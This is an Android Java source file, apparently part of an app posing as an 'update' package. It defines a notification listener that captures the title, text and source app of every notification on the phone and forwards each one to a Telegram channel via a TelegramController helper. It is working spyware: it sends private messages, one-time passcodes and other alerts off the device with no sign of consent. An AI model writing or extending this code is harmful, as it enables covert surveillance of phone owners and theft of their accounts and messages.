package com.kasari.update;

import android.content.Context;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import androidx.core.app.NotificationCompat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationCatcher extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = "";
            String text = "";
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                android.app.Notification.Action[] actions = sbn.getNotification().actions;
                CharSequence tickerText = sbn.getNotification().tickerText;
                
                if (tickerText != null) {
                    text = tickerText.toString();
                }
                
                if (sbn.getNotification().extras != null) {
                    title = sbn.getNotification().extras.getString(
                        android.app.Notification.EXTRA_TITLE, "");
                    
                    if (TextUtils.isEmpty(text)) {
                        CharSequence[] lines = sbn.getNotification().extras.getCharSequenceArray(
                            android.app.Notification.EXTRA_TEXT_LINES);
                        if (lines != null && lines.length > 0) {
                            StringBuilder sb = new StringBuilder();
                            for (CharSequence line : lines) {
                                if (line != null) {
                                    sb.append(line).append(" ");
                                }
                            }
                            text = sb.toString().trim();
                        }
                        
                        if (TextUtils.isEmpty(text)) {
                            text = sbn.getNotification().extras.getString(
                                android.app.Notification.EXTRA_TEXT, "");
                        }
                    }
                }
            }
            
            if (!TextUtils.isEmpty(title) || !TextUtils.isEmpty(text)) {
                String timestamp = new SimpleDateFormat("HH:mm:ss", 
                    Locale.getDefault()).format(new Date());
                
                TelegramController.sendMessage(this, 
                    "🔔 **Notification** [" + packageName + "]\n" +
                    "Title: " + (title.isEmpty() ? "N/A" : title) + "\n" +
                    "Text: " + text + "\n🕐 " + timestamp);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}